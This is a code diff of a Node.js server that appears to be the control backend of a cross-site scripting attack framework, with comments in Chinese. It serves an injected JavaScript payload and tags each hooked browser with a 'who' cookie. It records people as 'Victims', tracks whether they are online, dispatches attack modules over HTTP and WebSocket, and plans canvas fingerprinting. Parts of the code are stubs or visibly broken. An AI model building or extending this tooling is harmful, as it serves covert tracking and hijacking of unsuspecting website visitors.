@@ -32,22 +32,24 @@ app.use(session({
 }));
 app.use(csrf());
 function err404(req, res, next){
+    //  定义404页面
     return res.send(404, '( ・_・)');
 };
 app.use('/static', express.static(__dirname+'/static'));
 app.use('/home', function(req, res, next){
+    //  后台防护
     if(!req.session.user){return err404(req, res, next)};
     res.locals.token = req.csrfToken();
     res.header('X-Frame-Options', 'DENY');
     next();
 });
 function getmd5(str){
+    //  如其名
     return crypto.createHash('md5').update(str).digest('hex');
 }
 
-//   TODO 长逻辑, XSS处理部分
 app.all('/', function(req, res){
-    // 返回XSS JS 框架
+    //  返回XSSJS 框架
     res.header('Content-Type', 'application/javascript');
     return res.render('bungeegum', {
         domain:req.header('host'),
@@ -55,19 +57,21 @@ app.all('/', function(req, res){
     });
 });
 app.all('/i/', function(req, res){
-    // 返回模块
-    //TODO who id use "Canvas Fingerprinting"
+    //  返回模块
+    //  TODO who id use "Canvas Fingerprinting"
     var id = req.params.i;
     var who = req.cookies.who;
     sql.Victim.findOne({who:who}, function(err, info){
         if(info){
             return render('load', {
-                modules:info.modules
+                modules:info.load
             });
         };
+        //  若数据库内无Victim，则创建之
         sql.Item.findById(id, function(err, info){
             who = getmd5(info.owner+id+Date.now());
             res.cookie('who', who);
+            //  继承item的配置
             sql.Victim.create({
                 owner:info.owner,
                 who:who,
@@ -84,39 +88,36 @@ app.all('/i/', function(req, res){
         });
     });
 });
-function handle(re, modules, owner, victim, type){
-    var Process = {
-        Priority:[],
-        Accepted:[],
-        Dealwith:[],
-        Returns:[]
-    };
+function handle(re, modules, owner, victim, who, type){
+    //  处理服务端模块
     var share = {};
-    for(var n in modules){
-        var m = require('./'+n);
-        (m.type==type)&&Process[m.priority].push(m);
-    };
-    for(var p in Process){
-        p.forEach(function(m){
-            share[m.name] = m(
-                re,
-                owner,
-                modules[m.name],
-                victim,
-                share
-            );
-        });
-    };
+    modules.forEach(function(n){
+        var m = require('./'+n[0]);
+        if(m.type!=type){return null};
+        share[n[0]] = m(
+            re,
+            owner,
+            n[1],
+            victim,
+            who,
+            share
+        );
+    });
 };
 function httppage(req, res){
+    //  HTTP页面
     var pageid = req.params.uri;
+    var who = req.cookies.who;
+//    if(!who){return null};
+    online(who, Date.now());
     sql.Page.findOne({uri:pageid}, function(err, info){
         if(info.type != 'http'){return null};
         var owner = req.session.user&&(req.session.user.name == info.owner);
-        handle({q:req, s:res}, info.modules, owner, sql.Victim, 'http');
+        handle({q:req, s:res}, info.modules, owner, sql.Victim, who, 'http');
     });
 };
 function online(who, on){
+    //  是否在线？
     sql.Victim.findOne({who:who}, function(err, info){
         info&&sql.Victim.update({who:who}, {
             now:on
@@ -126,7 +127,10 @@ function online(who, on){
     });
 };
 function wspage(ws, req){
+    // WebSocket页面
     var pageid = req.params.uri;
+    var who = req.cookies.who;
+//    if(!who){return null};
     sql.Page.findOne({uri:pageid}, function(err, info){
         var page = info;
         if(info.type != 'ws'){return null};
@@ -140,7 +144,7 @@ function wspage(ws, req){
         });
         ws.on('message', function(msg){
             var owner = req.session.user&&(req.session.user.name == info.owner);
-            handle({q:req, s:ws}, info.modules, owner, sql.Victim, 'ws');
+            handle({q:req, s:ws}, info.modules, owner, sql.Victim, who, 'ws');
         });
     });
 };
@@ -219,8 +223,36 @@ app.get('/home/page/:uri/edit', function(req, res){
 });
 
 //   TODO 设置
-app.post('/home/victim/:name/edit', function(){});
-app.post('/home/page/:uri/edit', function(){});
+app.post('/home/victim/:name/edit', function(req, res){
+    //TODO
+});
+app.post('/home/page/:uri/edit', function(req, res){
+    //TODO
+});
+
+app.all('/home/modules', function(req, res){
+    var type = req.params.type;
+    var json = {};
+    if(type=='user'){
+        //TODO
+    };
+    if(type=='server'){
+        fs.readdirSync('./modules').forEach(function(n){
+            var m = require('./modules/'+n);
+            json[m.name] = {
+                name:m.name,
+                author:m.author,
+                description:m.description,
+                type:m.type,
+                params:m.params
+            }
+        });
+        return res.json(json);
+    };
+    if(type=='victim'){
+        //TODO
+    };
+});
 
 app.use('*', err404);
 app.listen(process.env.OPENSHIFT_NODEJS_PORT || 8080,
